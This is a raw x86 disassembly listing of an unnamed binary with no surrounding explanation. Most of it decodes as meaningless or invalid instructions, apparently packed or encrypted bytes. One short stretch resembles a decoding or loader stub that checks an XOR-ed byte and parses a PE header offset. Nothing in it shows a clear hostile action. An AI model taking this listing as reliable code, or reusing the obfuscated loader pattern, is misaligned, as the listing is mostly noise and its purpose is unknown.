  40f99b:	cli    
  40f99c:	dec    esp
  40f99d:	mov    ebp,DWORD PTR [ecx+0x76]
  40f9a0:	ror    ecx,1
  40f9a2:	xchg   edi,eax
  40f9a3:	stc    
  40f9a4:	dec    edx
  40f9a5:	sbb    BYTE PTR [ebx-0x3d],dh
  40f9a8:	ds push ecx
  40f9aa:	(bad)  
  40f9ab:	test   DWORD PTR [ebx+0x5efc0751],0x5953cf4b
  40f9b5:	sbb    cl,BYTE PTR [ebp+0x337c615f]
  40f9bb:	cmp    al,0x1a
  40f9bd:	and    esi,DWORD PTR [edi-0x38]
  40f9c0:	cld    
  40f9c1:	pop    esi
  40f9c2:	xor    eax,DWORD PTR [edx-0x7ea3cb04]
  40f9c8:	scas   al,BYTE PTR es:[edi]
  40f9c9:	ins    DWORD PTR es:[edi],dx
  40f9ca:	imul   esp,DWORD PTR [edx],0xffffffb9
  40f9cd:	jne    0x40fa11
  40f9cf:	xchg   edi,eax
  40f9d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9d1:	in     al,0x8e
  40f9d3:	mov    ah,0x66
  40f9d5:	add    al,0x23
  40f9d7:	pusha  
  40f9d8:	inc    eax
  40f9d9:	or     eax,0xd70c2592
  40f9de:	jmp    0x749e:0xcde200af
  40f9e5:	shr    DWORD PTR [ecx],1
  40f9e7:	add    DWORD PTR [esi+0x5d],esi
  40f9ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9eb:	dec    ebp
  40f9ec:	test   eax,0x4ff15332
  40f9f1:	mov    esp,0x69021778
  40f9f6:	adc    ecx,DWORD PTR [eax-0x39]
  40f9f9:	push   esp
  40f9fa:	or     DWORD PTR [edx],esi
  40f9fc:	or     ebp,DWORD PTR [edx-0x34c837d]
  40fa02:	inc    ebx
  40fa03:	and    ebx,DWORD PTR [ecx-0x4d]
  40fa06:	test   eax,0x9fa1eba4
  40fa0b:	or     BYTE PTR [eax-0x4d],bh
  40fa0e:	lea    esp,[eax+0x52ed0f86]
  40fa14:	sub    DWORD PTR [edx],0x8cdf4b50
  40fa1a:	fs ds pop ecx
  40fa1d:	lock mov edx,0x9d99582c
  40fa23:	in     al,dx
  40fa24:	mov    cl,cl
  40fa26:	andnps xmm0,XMMWORD PTR [ecx]
  40fa29:	xchg   ecx,eax
  40fa2a:	and    ecx,DWORD PTR [eax]
  40fa2c:	test   cl,cl
  40fa2e:	leave  
  40fa2f:	jns    0x40fa94
  40fa31:	loope  0x40fa64
  40fa33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa35:	addr16 sbb al,0x5d
  40fa38:	mov    dl,0x78
  40fa3a:	add    DWORD PTR [esi],edx
  40fa3c:	cli    
  40fa3d:	xor    edx,DWORD PTR [ebx+0x47]
  40fa40:	out    0xf1,al
  40fa42:	xlat   BYTE PTR ds:[ebx]
  40fa43:	fcom   QWORD PTR [esp+esi*1-0x73b131a0]
  40fa4a:	mov    eax,0xdb09ec59
  40fa4f:	ds mov ebx,0x4f63f955
  40fa55:	sub    al,0x37
  40fa57:	inc    ebx
  40fa58:	or     BYTE PTR [eax+0x521d164a],al
  40fa5e:	frndint 
  40fa60:	mov    eax,ds:0xb784a0b4
  40fa65:	sbb    DWORD PTR [ecx+0x665872cd],edx
  40fa6b:	jmp    0x47c7:0xdedd1b0c
  40fa72:	gs inc edi
  40fa74:	les    eax,FWORD PTR [ebx]
  40fa76:	mov    edx,0xce440675
  40fa7b:	out    0xf2,eax
  40fa7d:	iret   
  40fa7e:	sbb    BYTE PTR [edi+0x2e969c08],al
  40fa84:	push   esi
  40fa85:	push   esi
  40fa86:	xor    ecx,esi
  40fa88:	dec    esi
  40fa89:	(bad)  
  40fa8a:	push   0x516d5c25
  40fa8f:	sub    BYTE PTR [edx-0x46],dh
  40fa92:	inc    ebx
  40fa93:	cs sub esp,eax
  40fa96:	mov    ds:0x6638f557,al
  40fa9b:	mov    ch,0x30
  40fa9d:	mov    dl,bh
  40fa9f:	or     DWORD PTR [ecx-0x147c2acd],ecx
  40faa5:	push   eax
  40faa6:	or     DWORD PTR [ecx+0x14],0xff76fcbc
  40faad:	dec    esp
  40faae:	repnz out 0xce,al
  40fab1:	test   esp,esp
  40fab3:	push   es
  40fab4:	cld    
  40fab5:	jno    0x40fa93
  40fab7:	fnstenv [eax-0x2e]
  40faba:	(bad)  
  40fabb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fabc:	adc    al,0x80
  40fabe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fabf:	dec    eax
  40fac0:	dec    esi
  40fac1:	cli    
  40fac2:	push   0x95f005f9
  40fac7:	imul   DWORD PTR [edx+0x57382a57]
  40facd:	(bad)  
  40facf:	(bad)  
  40fad0:	retf   0x111f
  40fad3:	icebp  
  40fad4:	js     0x40fb3c
  40fad6:	test   al,0x43
  40fad8:	dec    ebx
  40fad9:	cmp    al,0x5c
  40fadb:	cmc    
  40fadc:	(bad)  
  40fadd:	push   edi
  40fade:	pop    ss
  40fadf:	jb     0x40faf5
  40fae1:	mov    bh,0xb0
  40fae3:	lods   al,BYTE PTR ds:[esi]
  40fae4:	mov    ds:0xf7c34a55,eax
  40fae9:	add    eax,0xf2d12d62
  40faee:	stc    
  40faef:	dec    DWORD PTR [edi+0x45ce6353]
  40faf5:	or     ebp,edx
  40faf7:	cld    
  40faf8:	aam    0xa4
  40fafa:	cli    
  40fafb:	sti    
  40fafc:	dec    ebp
  40fafd:	ja     0x40faa9
  40faff:	sub    ebp,DWORD PTR [ebx-0x64]
  40fb02:	or     edx,esi
  40fb04:	es inc edx
  40fb06:	cli    
  40fb07:	add    dh,BYTE PTR [eax-0x15]
  40fb0a:	jb     0x40fafe
  40fb0c:	dec    ebx
  40fb0d:	xor    BYTE PTR ds:0xd9fa8126,dh
  40fb13:	mov    edx,DWORD PTR ds:0x271cce5
  40fb19:	ja     0x40fae9
  40fb1b:	adc    eax,0xdf33e3dd
  40fb20:	ror    BYTE PTR [eax+esi*4-0x555d5ea],cl
  40fb27:	sub    BYTE PTR [ecx],dh
  40fb29:	jo     0x40fb1b
  40fb2b:	mov    BYTE PTR [ecx+0x554bb87b],bh
  40fb31:	cmp    DWORD PTR [edx],esi
  40fb33:	retf   0xd046
  40fb36:	ds xchg esp,eax
  40fb38:	mov    edi,0xfbf6eefb
  40fb3d:	stos   DWORD PTR es:[edi],eax
  40fb3e:	adc    DWORD PTR [ebx+eax*8+0x60],esp
  40fb42:	retf   
  40fb43:	loope  0x40fba9
  40fb45:	(bad)  
  40fb46:	sbb    DWORD PTR [ecx+ebx*2+0x1c],esi
  40fb4a:	daa    
  40fb4b:	xor    eax,0x28ba65cf
  40fb50:	xlat   BYTE PTR ds:[ebx]
  40fb51:	outs   dx,DWORD PTR ds:[esi]
  40fb52:	cwde   
  40fb53:	xchg   edx,eax
  40fb54:	mov    bh,ch
  40fb56:	xchg   ebx,eax
  40fb57:	sbb    DWORD PTR [ecx],0x2097eaf1
  40fb5d:	dec    edi
  40fb5e:	loop   0x40fb63
  40fb60:	or     BYTE PTR [edx+eiz*2-0x21],ah
  40fb64:	jo     0x40fb55
  40fb66:	dec    sp
  40fb68:	jb     0x40fbe8
  40fb6a:	fcomp  QWORD PTR [ecx]
  40fb6c:	pmullw mm0,QWORD PTR [esi-0x1a89ee1f]
  40fb73:	cmp    eax,0x83558f56
  40fb78:	push   ss
  40fb79:	mov    al,0x94
  40fb7b:	or     al,0xf8
  40fb7d:	pop    ebx
  40fb7e:	iret   
  40fb7f:	je     0x40fb8a
  40fb81:	adc    eax,0x8e5fa012
  40fb86:	stos   DWORD PTR es:[edi],eax
  40fb87:	sub    dh,dl
  40fb89:	les    esi,FWORD PTR [ebx+ecx*8+0x3f]
  40fb8d:	push   edx
  40fb8e:	sub    eax,0xf93e120
  40fb93:	ds cmp eax,0x892bdb73
  40fb99:	stos   DWORD PTR es:[edi],eax
  40fb9a:	push   ecx
  40fb9b:	neg    DWORD PTR ds:0x42e124
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0xaa
  40fbb3:	daa    
  40fbb4:	adc    eax,0x70b182f0
  40fbb9:	jo     0x40fb5e
  40fbbb:	jge    0x40fc2d
  40fbbd:	jo     0x40fc28
  40fbbf:	je     0x40fb96
  40fbc1:	lods   al,BYTE PTR ds:[esi]
  40fbc2:	push   ds
  40fbc3:	das    
  40fbc4:	int    0xdf
  40fbc6:	jecxz  0x40fba4
  40fbc8:	stos   BYTE PTR es:[edi],al
  40fbc9:	pop    ecx
  40fbca:	push   es
  40fbcb:	je     0x40fbe2
  40fbcd:	stos   BYTE PTR es:[edi],al
  40fbce:	inc    ebp
  40fbcf:	push   esp
  40fbd0:	push   cs
  40fbd1:	retf   
  40fbd2:	add    al,0xf8
  40fbd4:	lods   al,BYTE PTR ds:[esi]
  40fbd5:	inc    esp
  40fbd6:	fwait
  40fbd7:	inc    ebx
  40fbd8:	in     al,dx
  40fbd9:	sub    al,BYTE PTR [ebp-0x7b]
  40fbdc:	pop    ss
  40fbdd:	jg     0x40fb9b
  40fbdf:	xor    DWORD PTR [edi-0x5969d226],esp
  40fbe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbe6:	pop    ss
  40fbe7:	out    dx,al
  40fbe8:	push   edx
  40fbe9:	or     al,BYTE PTR [ebp-0x61b4e0b4]
  40fbef:	pop    ds
  40fbf0:	dec    ebp
  40fbf1:	inc    ecx
  40fbf2:	test   DWORD PTR [eax+0xa],esp
  40fbf5:	scas   al,BYTE PTR es:[edi]
  40fbf6:	mov    cl,0xbd
  40fbf8:	fs push ebx
  40fbfa:	js     0x40fba2
  40fbfc:	xchg   ebx,eax
  40fbfd:	fisttp QWORD PTR [edx-0x5b]
  40fc00:	lock xchg edx,eax
  40fc02:	test   DWORD PTR [ebp+0x13],ecx
  40fc05:	ds jae 0x40fbc4
  40fc08:	sub    DWORD PTR [edi],0x70f64472
  40fc0e:	cdq    
  40fc0f:	sub    al,0xbb
  40fc11:	popa   
  40fc12:	or     ebp,ebp
  40fc14:	jl     0x40fbe3
  40fc16:	and    BYTE PTR [esi+edx*1],ah
  40fc19:	dec    edx
  40fc1a:	sbb    al,0xc1
  40fc1c:	ins    DWORD PTR es:[edi],dx
  40fc1d:	mov    ds:0x4205c05f,al
  40fc22:	data16 ror BYTE PTR [edx],0x18
  40fc26:	adc    eax,0xcf8df57f
  40fc2b:	not    esi
  40fc2d:	bnd jb 0x40fbc4
  40fc30:	js     0x40fbc8
  40fc32:	movsx  esi,WORD PTR [esp+edi*8-0x4e]
  40fc37:	dec    edx
  40fc38:	jp     0x40fc82
  40fc3a:	(bad)  [esi]
  40fc3c:	leave  
  40fc3d:	dec    edx
  40fc3e:	les    esp,FWORD PTR [edx]
  40fc40:	mov    edx,0x408a5c04
  40fc45:	sahf   
  40fc46:	xor    esi,edi
  40fc48:	sub    eax,0x55591656
  40fc4d:	adc    eax,0x7d4aef75
  40fc52:	sub    al,0x5d
  40fc54:	repz into 
  40fc56:	fidiv  DWORD PTR [esi+0x5f]
  40fc59:	adc    al,0x11
  40fc5b:	push   edx
  40fc5c:	sub    edx,DWORD PTR [edi-0x58]
  40fc5f:	sbb    DWORD PTR [eax+0x23c5f703],0xe1d65cbf
  40fc69:	and    DWORD PTR gs:[edx+0x789af4fc],0xffffffa9
  40fc71:	xor    eax,esi
  40fc73:	mov    ebx,0x2581ac19
  40fc78:	cli    
  40fc79:	and    al,0xd6
  40fc7b:	jmp    0xec2b8dfc
  40fc80:	push   0xffffffbb
  40fc82:	dec    edx
  40fc83:	ins    DWORD PTR es:[di],dx
  40fc85:	jae    0x40fce3
  40fc87:	pop    ebp
  40fc88:	and    edi,esi
  40fc8a:	fcomip st,st(7)
  40fc8c:	dec    edx
  40fc8d:	daa    
  40fc8e:	mov    eax,0xe4b2fb8a
  40fc93:	je     0x40fcc0
  40fc95:	mov    bh,0xb
  40fc97:	fwait
  40fc98:	aaa    
  40fc99:	sbb    dh,BYTE PTR ds:0x75db3df6
  40fc9f:	in     eax,0xaf
  40fca1:	cs aad 0xf9
  40fca4:	arpl   WORD PTR [ebp+0x21e32187],dx
  40fcaa:	inc    esp
  40fcab:	pop    edi
  40fcac:	pop    edi
  40fcad:	mov    edi,0x5572a559
  40fcb2:	xchg   ebx,eax
  40fcb3:	xchg   DWORD PTR [edi+0x7d2eed42],esi
  40fcb9:	pusha  
  40fcba:	jno    0x40fcb3
  40fcbc:	pop    es
  40fcbd:	bnd ret 
  40fcbf:	jae    0x40fc4b
  40fcc1:	mov    eax,ds:0xdb59d121
  40fcc6:	sbb    DWORD PTR [edi],edi
  40fcc8:	(bad)  
  40fcc9:	ret    0xe0eb
  40fccc:	bound  ecx,QWORD PTR [edx+0x552a0ac8]
  40fcd2:	pop    esi
  40fcd3:	comiss xmm3,DWORD PTR [edi]
  40fcd6:	jle    0x40fcae
  40fcd8:	sbb    bh,BYTE PTR [ebx+ebx*1+0x712e2bf0]
  40fcdf:	les    esp,FWORD PTR [edx-0xd]
  40fce2:	retf   0xa233
  40fce5:	jg     0x40fd18
  40fce7:	std    
  40fce8:	adc    BYTE PTR [edx-0x2b727823],bl
  40fcee:	lock dec ecx
  40fcf0:	test   eax,0xa937776d
  40fcf5:	mov    edx,0xff808b89
  40fcfa:	data16 (bad) 
  40fcfd:	dec    eax
  40fcfe:	fadd   QWORD PTR [edx]
  40fd00:	xor    ah,bh
  40fd02:	mov    ah,0x47
  40fd04:	xor    eax,0x2021f1cc
  40fd09:	and    eax,0xd243e917
  40fd0e:	push   es
  40fd0f:	lahf   
  40fd10:	out    dx,al
  40fd11:	lods   eax,DWORD PTR ss:[esi]
  40fd13:	fdiv   QWORD PTR [ebx-0x524da10f]
  40fd19:	pop    ds
  40fd1a:	or     edi,DWORD PTR [edx-0x1075c5dd]
  40fd20:	push   es
  40fd21:	repz or edx,0x68
  40fd25:	lds    esi,FWORD PTR [eax-0x75]
  40fd28:	pop    ds
  40fd29:	push   ebp
  40fd2a:	sti    
  40fd2b:	in     al,dx
  40fd2c:	test   al,0xa0
  40fd2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd2f:	ins    DWORD PTR es:[edi],dx
  40fd30:	stos   DWORD PTR es:[edi],eax
  40fd31:	mov    ebx,0x9409a1c4
  40fd36:	push   edx
  40fd37:	cmp    ebp,DWORD PTR [ecx-0x6a]
  40fd3a:	or     eax,0xdaec92ef
  40fd3f:	daa    
  40fd40:	fist   WORD PTR [ebx]
  40fd42:	push   ebp
  40fd43:	cli    
  40fd44:	sub    al,0xac
  40fd46:	cmp    al,0xb2
  40fd48:	test   al,0x6d
  40fd4a:	xchg   edi,eax
  40fd4b:	dec    esi
  40fd4c:	mov    esp,0x52c91761
  40fd51:	mov    ?,eax
  40fd53:	pop    esi
  40fd54:	or     bh,al
  40fd56:	out    dx,al
  40fd57:	addr16 mov cl,0x93
  40fd5a:	add    eax,0x817c08ac
  40fd5f:	pop    ds
  40fd60:	mov    ecx,0x279dce14
  40fd65:	ins    BYTE PTR es:[edi],dx
  40fd66:	sub    eax,DWORD PTR [ebx]
  40fd68:	sub    DWORD PTR [eax],ebx
  40fd6a:	push   cs
  40fd6b:	nop
  40fd6c:	sbb    bl,BYTE PTR [esi+0x1]
  40fd6f:	dec    edx
  40fd70:	xor    dh,0x11
  40fd73:	call   0x9398be98
  40fd78:	retfw  0xdd40
  40fd7c:	loopne 0x40fd8e
  40fd7e:	jp     0x40fd49
  40fd80:	es push edi
  40fd82:	push   ebx
  40fd83:	xchg   edi,eax
  40fd84:	sub    DWORD PTR [ecx+0x3f],edx
  40fd87:	daa    
  40fd88:	cwde   
  40fd89:	jmp    0x3190:0x71c41467
  40fd90:	cmp    dl,BYTE PTR ds:0xa6c24886
  40fd96:	xchg   ebp,eax
  40fd97:	scas   eax,DWORD PTR es:[edi]
  40fd98:	repnz aam 0x50
  40fd9b:	not    bx
  40fd9e:	inc    ecx
  40fd9f:	add    bh,dl
  40fda1:	in     eax,dx
  40fda2:	pusha  
  40fda3:	cdq    
  40fda4:	or     eax,0x42fac581
  40fda9:	mov    DWORD PTR [edi],esi
  40fdab:	cmc    
  40fdac:	lock loopne 0x40fe09
  40fdaf:	cdq    
  40fdb0:	xor    BYTE PTR [esi-0x76ed60b9],dl
  40fdb6:	mov    dl,0x21
  40fdb8:	and    ch,BYTE PTR [edx]
  40fdba:	ss nop
  40fdbc:	lods   al,BYTE PTR ds:[esi]
  40fdbd:	mul    cl
  40fdbf:	cmovp  eax,ebx
  40fdc2:	ret    0x9253
  40fdc5:	retf   0xa3bf
  40fdc8:	imul   esp,ecx,0x497876a4
  40fdce:	mov    eax,0xa33841e1
  40fdd3:	sbb    dh,BYTE PTR ds:0xe71ffca8
  40fdd9:	mov    al,ds:0x3244877a
  40fdde:	cmp    DWORD PTR [ecx],ebx
  40fde0:	inc    edi
  40fde1:	sti    
  40fde2:	fucomip st,st(0)
  40fde4:	sbb    BYTE PTR [edi+0x74],al
  40fde7:	or     ebx,edx
  40fde9:	lods   eax,DWORD PTR cs:[esi]
  40fdeb:	arpl   WORD PTR [edi+0x6c],di
  40fdee:	mov    al,ds:0xa490fbb9
  40fdf3:	in     al,dx
  40fdf4:	jbe    0x40fdf8
  40fdf6:	aas    
  40fdf7:	(bad)  
  40fdf8:	mov    edi,0x812cd58d
  40fdfd:	push   0x20
  40fdff:	jns    0x40fe11
  40fe01:	(bad)  
  40fe02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe03:	mov    ds:0x8aa26a4f,al
  40fe08:	push   esi
  40fe09:	cmc    
  40fe0a:	or     al,0x52
  40fe0c:	je     0x40fe77
  40fe0e:	shl    BYTE PTR [esi-0x2f],cl
  40fe11:	mov    eax,ds:0xb3917387
  40fe16:	out    dx,eax
  40fe17:	int3   
  40fe18:	xor    eax,0x3b7d2fc9
  40fe1d:	mov    dl,0x59
  40fe1f:	mov    edx,0xe90c433a
  40fe24:	out    0xcc,al
  40fe26:	cmp    bh,bh
  40fe28:	mov    DWORD PTR [ecx+0x5921438d],ecx
  40fe2e:	mov    ebx,0x4916d598
  40fe33:	jge    0x40fe73
  40fe35:	or     DWORD PTR [ecx-0x40],esi
  40fe38:	mov    edx,0xc3a60b63
  40fe3d:	fwait
  40fe3e:	inc    ebp
  40fe3f:	push   edx
  40fe40:	mov    ds:0xf409dc6e,eax
  40fe45:	push   es
  40fe46:	push   es
  40fe47:	push   ebx
  40fe48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe49:	loopne 0x40fea2
  40fe4b:	mov    ch,0x85
  40fe4d:	sub    ch,BYTE PTR [edx]
  40fe4f:	lock xchg edx,esp
  40fe52:	pop    ebx
  40fe53:	aaa    
  40fe54:	pop    esp
  40fe55:	rol    DWORD PTR [ecx],1
  40fe57:	inc    ebp
  40fe58:	int3   
  40fe59:	jae    0x40fe54
  40fe5b:	fld    QWORD PTR [esi-0x4ca349a0]
  40fe61:	(bad)  
  40fe62:	(bad)  
  40fe64:	mov    ds:0x51cfda66,eax
  40fe69:	mov    ds:0x1d3ee0e6,eax
  40fe6e:	add    BYTE PTR [edx+0x4bf186a2],0x7e
  40fe75:	pop    ebx
  40fe76:	inc    esp
  40fe77:	dec    edx
  40fe78:	scas   eax,DWORD PTR es:[edi]
  40fe79:	adc    bl,ch
  40fe7b:	hlt    
  40fe7c:	push   esp
  40fe7d:	stos   BYTE PTR es:[edi],al
  40fe7e:	scas   eax,DWORD PTR es:[edi]
  40fe7f:	mov    al,ds:0xdbe7240a
  40fe84:	rol    DWORD PTR [esi+0x43fdc67f],1
  40fe8a:	mov    ds:0x4bbc1206,al
  40fe8f:	sub    edx,DWORD PTR [eax]
  40fe91:	gs jle 0x40fe43
  40fe94:	mov    ch,0x4b
  40fe96:	mov    esp,0xbd8e2705
  40fe9b:	cmp    eax,0x82c0a2e7
  40fea0:	stos   BYTE PTR es:[edi],al
  40fea1:	not    DWORD PTR [edx-0x35]
  40fea4:	add    DWORD PTR ds:0x57e4b453,esp
  40feaa:	add    ah,dl
  40feac:	in     eax,dx
  40fead:	pop    es
  40feae:	mov    dh,BYTE PTR [eax]
  40feb0:	test   eax,0x278761cb
  40feb5:	dec    edx
  40feb6:	(bad)  
  40feb7:	mov    ss,WORD PTR [edx+esi*2]
  40feba:	mov    ah,0xa3
  40febc:	add    eax,0x5ca97b85
  40fec1:	in     eax,0x6b
  40fec3:	push   ds
  40fec4:	in     eax,dx
  40fec5:	popf   
  40fec6:	lock adc al,BYTE PTR ds:0x63c1a661
  40fecd:	jae    0x40fe73
  40fecf:	xor    al,0xdf
  40fed1:	stos   BYTE PTR es:[edi],al
  40fed2:	cmp    al,0x3
  40fed4:	push   ebx
  40fed5:	xchg   edx,eax
  40fed6:	test   BYTE PTR [ecx+0x6fea6390],ch
  40fedc:	daa    
  40fedd:	repnz inc eax
  40fedf:	inc    edx
  40fee0:	into   
  40fee1:	aad    0x57
  40fee3:	stos   DWORD PTR es:[edi],eax
  40fee4:	xor    al,0xd4
  40fee6:	fild   WORD PTR [esi-0x69]
  40fee9:	inc    edx
  40feea:	sti    
  40feeb:	cmp    bl,al
  40feed:	fnstcw WORD PTR [esi-0x240f96db]
  40fef3:	div    dl
  40fef5:	icebp  
  40fef6:	add    ebp,0xffffff80
  40fef9:	or     BYTE PTR [ecx+0x95ed9ed],0x9c
  40ff00:	into   
  40ff01:	gs push cs
  40ff03:	xchg   esp,eax
  40ff04:	stos   BYTE PTR es:[edi],al
  40ff05:	(bad)  
  40ff06:	imul   esi
  40ff08:	jae    0x40fe8c
  40ff0a:	mov    ebp,0xfedfff97
  40ff0f:	aad    0x6a
  40ff11:	adc    bl,BYTE PTR [ebx+0x30f0a4ad]
  40ff17:	adc    eax,edi
  40ff19:	int    0x5f
  40ff1b:	lods   eax,DWORD PTR ds:[esi]
  40ff1c:	pop    ds
  40ff1d:	jns    0x40ff1d
  40ff1f:	leave  
  40ff20:	or     eax,0x72fd99a2
  40ff25:	jns    0x40ff90
  40ff27:	lds    eax,FWORD PTR [edi-0x7eb03b43]
  40ff2d:	mov    cl,0x4d
  40ff2f:	sbb    bh,0xcf
  40ff32:	outs   dx,DWORD PTR ds:[esi]
  40ff33:	mov    ecx,0xa05c7c7f
  40ff38:	fiadd  WORD PTR [edi+0x5fa40d5c]
  40ff3e:	pop    eax
  40ff3f:	push   esi
  40ff40:	js     0x40fefe
  40ff42:	lea    ebp,[edi]
  40ff44:	inc    eax
  40ff45:	leave  
  40ff46:	aad    0x17
  40ff48:	pop    ebx
  40ff49:	jmp    0x9446:0x5346a801
  40ff50:	mov    ch,0x5a
  40ff52:	cmp    DWORD PTR [ecx-0x7d],edi
  40ff55:	push   eax
  40ff56:	xlat   BYTE PTR ds:[ebx]
  40ff57:	jl     0x40ffbf
  40ff59:	pop    ss
  40ff5a:	jbe    0x40ff46
  40ff5c:	inc    ecx
  40ff5d:	mov    esi,0x3eba60fd
  40ff62:	xchg   al,al
  40ff64:	aaa    
  40ff65:	lods   eax,DWORD PTR ds:[esi]
  40ff66:	mov    ecx,0xa073cb14
  40ff6b:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40ff72:	mov    eax,DWORD PTR [ebp+0x8]
  40ff75:	mov    al,BYTE PTR [eax]
  40ff77:	mov    DWORD PTR ds:0x42e134,0x3a3a
  40ff81:	add    al,0x37
  40ff83:	xor    DWORD PTR ds:0x42e6f7,0x42fd7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fcd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fd76
  40ffaa:	and    edx,DWORD PTR ds:0x42e6fb
  40ffb0:	mov    DWORD PTR ds:0x42fd76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e703,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	and    DWORD PTR [eax-0x42ca009b],ebp
  40ffe2:	jo     0x410054
  40ffe4:	mov    ds:0x8e70707d,eax
  40ffe9:	cld    
  40ffea:	(bad)  
  40ffeb:	jae    0x40ff97
  40ffed:	mov    bl,0xab
  40ffef:	scas   eax,DWORD PTR es:[edi]
  40fff0:	into   
  40fff1:	in     al,dx
  40fff2:	jbe    0x410054
  40fff4:	das    
  40fff5:	push   ebp
  40fff6:	sahf   
  40fff7:	push   ss
  40fff8:	mov    ebx,0x9d4ced1c
  40fffd:	and    al,0x2e
  40ffff:	jle    0x410038
  410001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410002:	xchg   cl,dl
  410004:	retf   0x370f
  410007:	sub    edi,esi
  410009:	and    BYTE PTR [esi-0x7b2871],bl
  41000f:	dec    ebp
  410010:	(bad)  
  410011:	jne    0x40ffe0
  410013:	cmp    bl,bh
  410015:	loop   0x40ffe7
  410017:	dec    ebp
  410018:	ins    BYTE PTR es:[edi],dx
  410019:	or     BYTE PTR [esi+0x27],0xef
  41001d:	stc    
  41001e:	or     dh,BYTE PTR [esi-0x11]
  410021:	fst    QWORD PTR [esi-0x6b64144e]
  410027:	jp     0x40ffc0
  410029:	push   edi
  41002a:	mov    ch,0x0
  41002c:	push   ebp
  41002d:	adc    ebx,DWORD PTR [edi]
  41002f:	or     DWORD PTR [ecx],0x5c6c9c19
  410035:	dec    ecx
  410036:	pop    es
  410037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410038:	cmp    bh,BYTE PTR ss:[esi]
  41003b:	fcom   DWORD PTR [ebp-0x3e]
  41003e:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  410040:	dec    eax
  410041:	add    DWORD PTR [ebx],ebx
  410043:	rdmsr  
  410045:	mov    ch,0x2c
  410047:	pop    edi
  410048:	leave  
  410049:	push   ebp
  41004a:	inc    edi
  41004b:	xor    esi,DWORD PTR [edx+0x2c]
  41004e:	es cdq 
  410050:	(bad)  
  410052:	daa    
  410053:	cmp    BYTE PTR [ecx-0x2c],bh
  410056:	enter  0xf16c,0xdd
  41005a:	sub    ch,dl
  41005c:	fwait
  41005d:	push   edx
  41005e:	rcl    DWORD PTR [edx],0xd4
  410061:	call   0xdf2:0x98a6a8d2
  410068:	mov    ebx,0x278bc0c0
  41006d:	jae    0x410099
  41006f:	cdq    
  410070:	jbe    0x4100ec
  410072:	aaa    
  410073:	cmp    BYTE PTR [ebx-0xa856911],dl
  410079:	adc    dl,dh
  41007b:	mov    bh,0xe0
  41007d:	push   es
  41007e:	nop
  41007f:	xor    DWORD PTR [ebx-0x16],0xc416ebf1
  410086:	jnp    0x4100a3
  410088:	mov    ds:0x8a4044d8,eax
  41008d:	pop    ebx
  41008e:	into   
  41008f:	jns    0x41003a
  410091:	std    
  410092:	xchg   DWORD PTR [esi],ebp
  410094:	sub    BYTE PTR [ecx+ebx*8-0x11e7e13a],dh
  41009b:	or     eax,DWORD PTR [ebx]
  41009d:	mov    gs,WORD PTR [ebp+0x79]
  4100a0:	addr16 and al,0x3a
  4100a3:	pop    eax
  4100a4:	lock out dx,eax
  4100a6:	icebp  
  4100a7:	xor    cl,al
  4100a9:	xor    DWORD PTR [eax*4-0x38b00f4e],edx
  4100b0:	jbe    0x4100e0
  4100b2:	push   0xd
  4100b4:	or     al,0x5d
  4100b6:	ss or  al,0x33
  4100b9:	sub    dl,bl
  4100bb:	retf   0x39e6
  4100be:	xchg   esp,edx
  4100c0:	(bad)  
  4100c1:	call   0x6588c5f5
  4100c6:	mov    eax,ds:0x15bb8c4a
  4100cb:	lea    ebp,[ebp+0x4d]
  4100ce:	pop    ebp
  4100cf:	fwait
  4100d0:	imul   eax,ecx,0x14284a8c
  4100d6:	repnz retf 
  4100d8:	add    ebp,esi
  4100da:	add    al,0x74
  4100dc:	mov    esi,0xce6b8e71
  4100e1:	mov    BYTE PTR [edx+edx*2],dh
  4100e4:	je     0x410104
  4100e6:	jb     0x4100e3
  4100e8:	in     al,0xc8
  4100ea:	and    cl,al
  4100ec:	adc    esp,DWORD PTR [edx+0x53167b6a]
  4100f2:	leave  
  4100f3:	fild   DWORD PTR [ebp+edx*4+0x38]
  4100f7:	sbb    al,0x8a
  4100f9:	and    edx,DWORD PTR [edx-0x5]
  4100fc:	(bad)  [ebx+0x1db68335]
  410102:	push   es
  410103:	add    al,0x53
  410105:	cmp    BYTE PTR [edx+0x37],0xad
  410109:	dec    ebp
  41010a:	push   eax
  41010b:	retf   0x3dd6
  41010e:	sub    DWORD PTR [ebx],0xffffffe5
  410111:	mov    es,ebp
  410113:	push   esi
  410114:	add    BYTE PTR [edi+0x2e86146d],0xff
  41011b:	into   
  41011c:	sbb    eax,0x2cb4f2dd
  410121:	push   ebx
  410122:	push   0x77
  410124:	(bad)  
  410125:	fwait
  410126:	xchg   ebp,eax
  410127:	call   0xdf9c:0xe1d4358
  41012e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41012f:	adc    esp,DWORD PTR [esi-0x324dab5f]
